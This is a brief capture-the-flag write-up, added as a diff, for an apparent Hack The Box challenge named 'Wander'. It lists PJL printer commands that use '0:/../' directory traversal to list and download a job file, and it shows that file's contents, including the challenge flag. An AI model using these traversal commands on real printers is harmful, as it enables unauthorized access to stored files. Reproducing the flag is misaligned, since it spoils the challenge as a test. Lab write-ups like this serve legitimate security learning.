@@ -1,0 +1,16 @@
+Challenge : Wander
+
+ip : 154.57.164.64:30119
+
+Acess the web service through the ip.
+
+\-> /jobs -> /printer
+
+  @PJL INFO ID --> ?
+
+
+@PJL FSDIRLIST NAME="0:/../home/default/" ENTRY=1
+@PJL FSUPLOAD FORMAT:BINARY NAME="0:/../home/default/readyjob" SIZE=457
+
+@PJL FSUPLOAD FORMAT:BINARY NAME="0:/../home/default/readyjob" OFFSET=0 SIZE=457
+%-12345X@PJL @PJL COMMENT FLAG = "HTB{w4lk_4nd_w0nd3r}" @PJL JOB NAME = "JetDirect Boot Job" @PJL SET USERNAME="default" @PJL SET HOLDKEY="8214" @PJL SET ORIENTATION = PORTAIT @PJL SET QTY = 1 @PJL SET DUPLEX = ON @PJL SET RESOLUTION = 600 @PJL SET OUTBIN = LOWER @PJL COMMENT START PCL JOB @PJL ENTER LANGUAGE = PCL %-12345X@PJL @PJL EOJ %-12345X
